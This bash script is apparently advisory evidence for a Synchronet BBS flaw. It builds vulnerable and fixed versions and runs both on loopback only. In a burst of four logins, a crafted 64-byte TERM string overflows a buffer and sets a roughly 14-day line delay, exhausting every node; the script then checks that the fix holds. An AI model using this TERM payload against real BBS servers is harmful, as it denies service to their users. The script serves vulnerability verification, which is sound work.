#!/usr/bin/env bash
# W16: measure the advisory availability claim with VALID BBS credentials and
# a DEFAULT (no SSH_ANYAUTH) loopback config. Combines the W15 real password
# login with the W6 four-node burst: four chosen 64-byte TERMs set line_delay
# to 0x4853494d (~14-day nanosleep), then a fifth clean 40-byte login.
# Vulnerable pinned statement should exhaust four nodes; upstream cb6d77dbca
# fixed form should serve all five. Author evidence only, loopback only.
set -euo pipefail
cd "$(dirname "$0")/../.."
HERE=$PWD
TREE=$HERE/src-tree
P=$HERE/provision
E=$HERE/real-answer/validuser/availability-evidence
PARENT=42f586d70792e46b4934176976bc7949b312dede
PORT=22230
PASSWORD=LabPass123
DEBS="zip libarchive-dev libnspr4-dev autoconf2.13"
pass=0
fail=0

note() { echo "VALIDAVAIL $*"; }
expect() {
    local what=$1 desc=$2
    if eval "$what"; then
        note "PASS $desc"; pass=$((pass + 1))
    else
        note "FAIL $desc (test: $what)"; fail=$((fail + 1))
    fi
}

mkdir -p "$E" "$P/debs" "$P/local"
command -v sshpass >/dev/null || { echo NO_SSHPASS; exit 1; }
test "$(git -C "$TREE" rev-parse HEAD)" = "$PARENT" || { echo TREE_HEAD_MISMATCH; exit 2; }

# Same offline user provisioning as W15; the binary resolves data_dir under
# ctrl/, hence the ctrl/data -> ../data symlink.
ln -sfn ../data "$TREE/ctrl/data"
if ! grep -q LABPASS123 "$TREE/data/user/user.tab" 2>/dev/null; then
    (cd "$TREE" && ./src/sbbs3/gcc.linux.x64.exe.debug/makeuser ./ctrl/ lab \
        -P "$PASSWORD" -R 'Lab User' -S 50) > "$E/makeuser.log" 2>&1 || {
            echo MAKEUSER_FAILED; exit 3;
        }
fi
grep -q LABPASS123 "$TREE/data/user/user.tab" || { echo USER_RECORD_MISSING; exit 4; }
note "USER_RECORD_OK $(wc -c < "$TREE/data/user/user.tab") bytes"

for d in $DEBS; do
    (cd "$P/debs" && test -f "${d}_"*.deb || apt-get download "$d")
done
for d in "$P"/debs/*.deb; do dpkg-deb -x "$d" "$P/local"; done
L=$P/local/usr/lib/x86_64-linux-gnu
ln -sf autoconf2.13 "$P/local/usr/bin/autoconf-2.13"
ln -sf /usr/lib/x86_64-linux-gnu/libacl.so.1 "$L/libacl.so"
export PATH="$P/local/usr/bin:$PATH"
export AC_MACRODIR="$P/local/usr/share/autoconf2.13"
export PKG_CONFIG_PATH="$L/pkgconfig${PKG_CONFIG_PATH:+:$PKG_CONFIG_PATH}"
export CPATH="$P/local/usr/include:$P/local/usr/include/nspr${CPATH:+:$CPATH}"
export LIBRARY_PATH="$L${LIBRARY_PATH:+:$LIBRARY_PATH}"
export LD_LIBRARY_PATH="$L${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
FLIBS="-L$L -larchive -lnettle -lacl -llzma -lzstd -llz4 -lbz2 -lz -lxml2"

cleanup_stale() {
    pkill -9 -f 'gcc.linux.x64.exe.debug/sbbs nd nh nj ne' 2>/dev/null || true
    sleep 1
}
write_ini() {
    cat > "$TREE/ctrl/sbbs.$(hostname).ini" <<EOF
; W16 lab-only loopback config: default auth (no SSH_ANYAUTH), port $PORT
[Global]
	Hostname =
	Interface = 127.0.0.1
	OutboundInterface = 127.0.0.1
	TempDirectory =
	LogLevel = Debugging
	TLSErrorLevel = Debugging
[BBS]
	AutoStart = true
	SSHInterface = 127.0.0.1
	SSHErrorLevel = Debugging
	SSHPort = $PORT
	SSHConnectTimeout = 10s
	FirstNode = 1
	LastNode = 4
	Options = XTRN_MINIMIZED | ALLOW_SSH | NO_TELNET | NO_HOST_LOOKUP | NO_EVENTS
[Mail]
	AutoStart = false
[FTP]
	AutoStart = false
[Web]
	AutoStart = false
[Services]
	AutoStart = false
[UNIX]
	Daemonize = False
	PidFile = sbbs-w16.pid
	LogFacility = User
	LogIdent = synchronet-w16
	umask = 077
EOF
}
port_bindable() {
    python3 - "$PORT" <<'PY'
import socket
import sys
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.bind(('127.0.0.1', int(sys.argv[1])))
except OSError:
    sys.exit(1)
finally:
    s.close()
PY
}
wait_port_free() {
    for i in $(seq 1 120); do
        if ! ss -ltn 2>/dev/null | grep -q ":$PORT " && port_bindable; then
            return 0
        fi
        cleanup_stale
        sleep 0.5
    done
    echo PORT_BUSY; return 1
}
start_server() {
    local label=$1 log="$E/$2"
    wait_port_free || return 1
    (cd "$TREE" && exec env SBBSCTRL="$TREE/ctrl" \
        ./src/sbbs3/gcc.linux.x64.exe.debug/sbbs nd nh nj ne > "$log" 2>&1) &
    SPID=$!
    for i in $(seq 1 120); do
        if grep -q '!ERROR 98 binding SSH Server socket' "$log"; then
            echo PORT_BIND_ERROR; return 1
        fi
        # "SSH Server listening" is printed before bind; this line proves the
        # four node threads are actually up. W16's second run raced TIME_WAIT.
        grep -q 'Terminal Server thread started for nodes 1 through 4' "$log" && return 0
        sleep 0.5
    done
    echo SERVER_START_TIMEOUT; return 1
}
stop_server() {
    [ -n "${SPID:-}" ] && kill -TERM "$SPID" 2>/dev/null || true
    [ -n "${SPID:-}" ] && wait "$SPID" 2>/dev/null || true
    cleanup_stale
    SPID=
}
trap stop_server EXIT

run_case() {
    local term=$1 out=$2 secs=$3 i
    (for i in $(seq 1 $((secs / 2))); do echo x; sleep 0.2; done) | \
      TERM="$term" timeout $((secs + 4)) sshpass -p "$PASSWORD" ssh -tt \
        -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=password -o PubkeyAuthentication=no \
        -o PasswordAuthentication=yes -o KbdInteractiveAuthentication=no \
        -o HostKeyAlgorithms=+ssh-rsa -o ConnectTimeout=5 \
        -p "$PORT" lab@127.0.0.1 > "$out" 2>&1 || true
}
build() {
    cleanup_stale
    make -C "$TREE/3rdp/build" jslib > "$P/jslib-w16.log" 2>&1 || return 1
    make -C "$TREE/src/sbbs3" FILE_LIBS="$FLIBS" > "$P/build-w16.log" 2>&1 || return 1
}

CHOSEN="$(printf 'A%.0s' $(seq 1 41))$(printf 'B%.0s' $(seq 1 3))MISHE-OOTAUFTAUF$(printf 'Z%.0s' $(seq 1 4))"
CONTROL="$(printf 'A%.0s' $(seq 1 40))"
test "${#CHOSEN}" -eq 64 || { echo BAD_TERM_LENGTH; exit 5; }
VULN_PROBE='REAL_ANSWER_PROBE sizeof=41 l=64 off41=42 off44=4853494d off48=4f4f2d45 off52=TAUFTAUF'
FIXED_PROBE='REAL_FIXED_PROBE sizeof=41 len=64 off40=00 off44=00000000 off48=00000000 off52='

burst() {
    # $1=label, $2=TERM, $3=probe string
    local label=$1 term=$2 probe=$3 i c pids=()
    for i in 1 2 3 4; do
        run_case "$term" "$E/${label}-client-$i.log" 10 &
        pids+=($!)
        sleep 0.4
    done
    c=0
    for i in $(seq 1 60); do
        c=$(grep -c "$probe" "$E/${label}-server.log" 2>/dev/null || true)
        [ "$c" -ge 4 ] && break
        sleep 0.25
    done
    note "$label probes seen: $c"
    for p in "${pids[@]}"; do wait "$p" || true; done
    sleep 2
    # /proc snapshot: gdb -p is unavailable here (Yama ptrace_scope).
    for t in /proc/$SPID/task/*; do
        printf '%s ' "$(basename "$t")"
        (cat "$t/comm" "$t/wchan" "$t/syscall" 2>/dev/null || true) | tr '\n' ' '
        echo
    done > "$E/${label}-threads.txt"
    run_case "$CONTROL" "$E/${label}-client-5th.log" 10
}

# 1. Vulnerable pinned statement.
git -C "$TREE" checkout -- src/sbbs3/answer.cpp
(cd "$TREE" && patch -p1 < "$HERE/real-answer/vulnerable-probe.patch") || exit 6
build || { echo BUILD_FAILED_VULN; exit 7; }
write_ini
start_server vuln vuln-server.log || exit 8
burst vuln "$CHOSEN" "$VULN_PROBE"
stop_server

# 2. Upstream fixed form (cb6d77dbca helper + SAFECOPY).
git -C "$TREE" checkout -- src/sbbs3/answer.cpp
(cd "$TREE" && patch -p1 < "$HERE/real-answer/fixed-probe.patch") || exit 9
build || { echo BUILD_FAILED_FIXED; exit 10; }
write_ini
start_server fixed fixed-server.log || exit 11
burst fixed "$CHOSEN" "$FIXED_PROBE"
stop_server

# Checks. Negative observations are evidence, not retry targets.
expect "test \$(grep -c '$VULN_PROBE' '$E/vuln-server.log') -ge 4" \
    'vulnerable: four valid-credential chosen line_delay probes'
expect "test \$(grep -c 'SSH password authentication successful' '$E/vuln-server.log') -ge 4" \
    'vulnerable: four password authentications succeeded'
expect "grep -q '!No nodes available for login.' '$E/vuln-server.log'" \
    'vulnerable: fifth valid-credential login refused for node exhaustion'
expect "grep -qiE 'nanosleep|hrtimer' '$E/vuln-threads.txt'" \
    'vulnerable: a server thread parked in nanosleep'
expect "test \$(grep -c \"SSH login: 'lab'\" '$E/vuln-server.log') -ge 4" \
    'vulnerable: four clients logged in as lab'
expect "test \$(grep -c '$FIXED_PROBE' '$E/fixed-server.log') -ge 4" \
    'fixed: four bounded probes'
expect "! grep -q '!No nodes available for login.' '$E/fixed-server.log'" \
    'fixed: fifth valid-credential login not refused'
expect "test \$(grep -c 'Attaching to Node' '$E/fixed-server.log') -ge 5" \
    'fixed: five connections each attached to a node'
expect "test \$(grep -c 'SSH password authentication successful' '$E/fixed-server.log') -ge 5" \
    'fixed: five password authentications succeeded'
expect "! grep -q 'SSH_ANYAUTH' '$E/vuln-server.log' '$E/fixed-server.log'" \
    'both configs lacked the SSH_ANYAUTH token'

echo "RESULT: PASS=$pass FAIL=$fail"
note "EVIDENCE_DIR=$E"
test "$fail" -eq 0
